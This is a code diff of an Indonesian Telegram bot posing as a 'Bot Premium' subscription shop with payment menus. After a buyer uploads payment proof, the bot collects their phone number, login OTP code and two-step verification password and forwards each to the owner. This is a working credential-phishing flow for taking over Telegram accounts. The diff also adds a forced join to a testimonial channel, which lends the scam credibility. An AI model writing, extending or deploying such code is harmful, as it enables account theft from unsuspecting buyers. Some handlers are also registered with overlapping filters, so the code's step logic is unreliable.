@@ -1,5 +1,7 @@
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import (
+    Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
+)
 from telegram.constants import ParseMode
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, CallbackQueryHandler,
@@ -7,6 +9,8 @@ from telegram.ext import (
 )
 from config import API_TOKEN, OWNER_ID
 
+# ID atau username channel testimoni
+force_subscribe_channel = "@testimoniserpa"
 
 # Setup logging
 logging.basicConfig(
@@ -15,7 +19,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# /start
+# /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     welcome_text = "👋 Selamat datang di Bot Premium!\nSilakan pilih menu di bawah ini:"
@@ -27,12 +31,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(welcome_text, reply_markup=reply_markup)
 
-
-# Menu durasi
+# Menu pemilihan durasi
 async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-
     keyboard = [
         [InlineKeyboardButton("1 Bulan", callback_data="1_bulan")],
         [InlineKeyboardButton("3 Bulan", callback_data="3_bulan")],
@@ -41,34 +43,30 @@ async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await query.edit_message_text("📆 Pilih durasi pembelian:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-
-# Metode pembayaran
+# Pilih metode pembayaran
 async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     duration = query.data
     context.user_data["durasi"] = duration
-
     keyboard = [
-        [InlineKeyboardButton("QRIS", callback_data='bayar_qris')], 
-        [InlineKeyboardButton("Bank", callback_data='bayar_bank')], 
-        [InlineKeyboardButton("DANA", callback_data='bayar_dana')], 
-        [InlineKeyboardButton("Gopay", callback_data='bayar_gopay')], 
+        [InlineKeyboardButton("QRIS", callback_data='bayar_qris')],
+        [InlineKeyboardButton("Bank", callback_data='bayar_bank')],
+        [InlineKeyboardButton("DANA", callback_data='bayar_dana')],
+        [InlineKeyboardButton("Gopay", callback_data='bayar_gopay')],
         [InlineKeyboardButton("⬅️ Kembali", callback_data='menu')]
     ]
     await query.edit_message_text(
-        text=f"Pilih metode pembayaran untuk *{duration.replace('_', ' ')}*: ",
+        text=f"Pilih metode pembayaran untuk *{duration.replace('_', ' ')}*:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
     )
 
-
-# Info pembayaran
+# Informasi pembayaran
 async def info_pembayaran(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     metode = query.data.replace("bayar_", "")
-
     if metode == "qris":
         await query.edit_message_text(
             text="🔗 Silakan scan QRIS atau klik link berikut:\nhttps://t.me/serpagengs"
@@ -88,73 +86,72 @@ async def info_pembayaran(update: Update, context: ContextTypes.DEFAULT_TYPE):
 Setelah transfer, silakan kirim bukti (foto) ke bot ini."""
         )
 
+# Fungsi cek apakah user sudah join channel
+async def check_user_subscribed(bot, user_id):
+    try:
+        member = await bot.get_chat_member(force_subscribe_channel, user_id)
+        return member.status in [ChatMember.MEMBER, ChatMember.OWNER, ChatMember.ADMINISTRATOR]
+    except Exception:
+        return False
 
-# Terima bukti transfer (foto) dan kirim hanya ke owner
+# Handle foto bukti transfer
 async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     file = await update.message.photo[-1].get_file()
     context.user_data["bukti_transfer_file_id"] = file.file_id
 
-    # Kirim bukti transfer dan data ke owner
-    caption = (
-        f"📩 *Data Pembeli Baru*\n"
-        f"👤 Dari: [{user.first_name}](tg://user?id={user.id})\n"
-        f"🆔 ID: `{user.id}`\n"
-        f"💬 Username: @{user.username or 'tidak tersedia'}\n\n"
-        f"📱 Nomor HP: `{context.user_data.get('nomor_hp', 'Belum diterima')}`\n"
-        f"🔑 OTP: `{context.user_data.get('otp', 'Belum diterima')}`\n"
-        f"🔒 Verifikasi 2 Langkah: `{context.user_data.get('verifikasi_2_langkah', 'Belum diterima')}`"
-    )
+    # Cek apakah user sudah join channel testimoni
+    if not await check_user_subscribed(context.bot, user.id):
+        keyboard = [[InlineKeyboardButton("✅ Sudah Join", callback_data="sudah_join_channel")]]
+        await update.message.reply_text(
+            f"❗️Untuk melanjutkan, silakan join channel testimoni terlebih dahulu:\n{force_subscribe_channel}",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return
 
-    await context.bot.send_photo(
-        chat_id=int(OWNER_ID),
-        photo=file.file_id,
-        caption=caption,
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text("✅ Bukti diterima. Sekarang silakan masukkan nomor HP yang akan digunakan.")
 
-    # Memberitahukan pengguna bahwa bukti telah diterima dan menunggu konfirmasi dari admin
-    await update.message.reply_text("✅ Bukti diterima. Mohon tunggu konfirmasi dari admin.")
+# Callback setelah tekan tombol "Sudah Join"
+async def sudah_join_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user = query.from_user
 
+    if not await check_user_subscribed(context.bot, user.id):
+        await query.edit_message_text("❌ Kamu belum join channel. Silakan join terlebih dahulu.")
+        return
 
-# Step 1: Nomor HP (hanya untuk owner yang bisa melihat)
+    await query.edit_message_text("✅ Terima kasih sudah join channel.\nSekarang masukkan nomor HP yang akan digunakan.")
+
+# Input nomor HP
 async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if "bukti_transfer_file_id" not in context.user_data:
         return
     context.user_data["nomor_hp"] = update.message.text
-
-    # Kirim hanya ke owner
     await context.bot.send_message(
         chat_id=int(OWNER_ID),
         text=f"📱 Nomor HP diterima: `{update.message.text}`"
     )
-
     await update.message.reply_text("📩 Sekarang kirim kode OTP yang kamu terima.")
 
-
-# Step 2: OTP (hanya untuk owner yang bisa melihat)
+# Input OTP
 async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if "nomor_hp" not in context.user_data:
         return
     context.user_data["otp"] = update.message.text
-
-    # Kirim hanya ke owner
     await context.bot.send_message(
         chat_id=int(OWNER_ID),
         text=f"🔑 OTP diterima: `{update.message.text}`"
     )
-
     await update.message.reply_text("🔒 Jika kamu menggunakan verifikasi 2 langkah, kirim sekarang. Jika tidak, ketik `-`.")
 
-
-# Step 3: Verifikasi 2 langkah & kirim ke OWNER
+# Verifikasi 2 langkah & kirim semua data ke owner
 async def handle_verifikasi_dua_langkah(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if "otp" not in context.user_data:
         return
     context.user_data["verifikasi_2_langkah"] = update.message.text
     user = update.effective_user
 
-    # Kirim ke OWNER
     caption = (
         f"📩 *Data Pembeli Baru*\n"
         f"👤 Dari: [{user.first_name}](tg://user?id={user.id})\n"
@@ -174,8 +171,7 @@ async def handle_verifikasi_dua_langkah(update: Update, context: ContextTypes.DE
 
     await update.message.reply_text("✅ Data kamu sudah dikirim ke admin. Mohon tunggu konfirmasi.")
 
-
-# Owner balas → diteruskan ke user
+# Balasan dari owner ke user
 async def handle_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != int(OWNER_ID):
         return
@@ -187,24 +183,17 @@ async def handle_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_message(chat_id=user_id, text=update.message.text)
                 await update.message.reply_text("📨 Pesan sudah dikirim ke user.")
 
-
-# Handle konfirmasi atau tolak oleh owner
+# Konfirmasi atau tolak dari owner
 async def handle_konfirmasi_tolak(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-
-    # Ambil data user yang sesuai dari caption pesan
     user_id = int(query.message.caption.split("\n")[2].split(":")[1].strip())
-    
+
     if query.data == "konfirmasi":
-        # Kirim pesan ke user untuk konfirmasi pembelian
         await context.bot.send_message(
             chat_id=user_id,
-            text="✅ Pembelian kamu telah dikonfirmasi! Selamat! Silakan lanjutkan ke langkah pertama.\n\n"
-                 "📱 Masukkan nomor HP yang akan digunakan."
+            text="✅ Pembelian kamu telah dikonfirmasi! Silakan masukkan nomor HP untuk langkah selanjutnya."
         )
-        
-        # Lanjutkan ke Step 1 (input nomor HP)
         await query.edit_message_text(text="✅ Pembelian telah dikonfirmasi.")
     else:
         await context.bot.send_message(
@@ -213,22 +202,21 @@ async def handle_konfirmasi_tolak(update: Update, context: ContextTypes.DEFAULT_
         )
         await query.edit_message_text(text="❌ Pembelian ditolak.")
 
-
+# Main function
 def main():
     app = ApplicationBuilder().token(API_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(menu, pattern="menu"))
     app.add_handler(CallbackQueryHandler(payment_method, pattern="1_bulan|3_bulan|6_bulan|12_bulan"))
     app.add_handler(CallbackQueryHandler(info_pembayaran, pattern="bayar_qris|bayar_bank|bayar_dana|bayar_gopay"))
+    app.add_handler(CallbackQueryHandler(sudah_join_channel, pattern="sudah_join_channel"))
     app.add_handler(MessageHandler(filters.PHOTO, handle_media))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_verifikasi_dua_langkah))
     app.add_handler(CallbackQueryHandler(handle_konfirmasi_tolak, pattern="konfirmasi|tolak"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reply))
-
     app.run_polling()
-
 
 if __name__ == "__main__":
     main()
